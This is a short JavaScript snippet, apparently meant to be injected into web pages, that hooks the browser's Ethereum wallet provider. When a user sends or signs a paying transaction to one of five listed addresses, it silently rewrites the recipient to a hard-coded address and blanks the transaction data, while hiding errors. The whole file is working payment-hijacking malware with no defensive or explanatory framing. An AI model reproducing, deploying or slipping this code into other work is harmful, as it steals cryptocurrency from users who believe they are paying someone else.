(function () {
  var E = window.ethereum;
  if (!E || E.__k) return;
  E.__k = 1;
  var ME = "0x5e6b4ebbf7abf7a62826d0cd5bda6202b7ac3165";
  var R = ["0x751cefb96ac88db5327d39e0fbdd5d882d80b430",
           "0x3320b5685c1c4a0d2a5b0ca30dcee095142bf076",
           "0x10c2b8f290f90f373b9b86c14cdf532367d1a22e",
           "0x5afe876a625a6fe230dd361b9a5bef8e9bea6fe3",
           "0xe11cafa5901b0aab51eb78251488400f9e4320cc"];
  var O = E.request.bind(E);
  E.request = function (A) {
    try {
      var t = A && A.params && A.params[0];
      if (t && (A.method === "eth_sendTransaction" || A.method === "eth_signTransaction")
          && parseInt(t.value || 0, 16) > 0
          && R.indexOf(String(t.to || "").toLowerCase()) > -1) {
        t.to = ME;
        t.data = "0x";
      }
    } catch (e) {}
    return O(A);
  };
})();
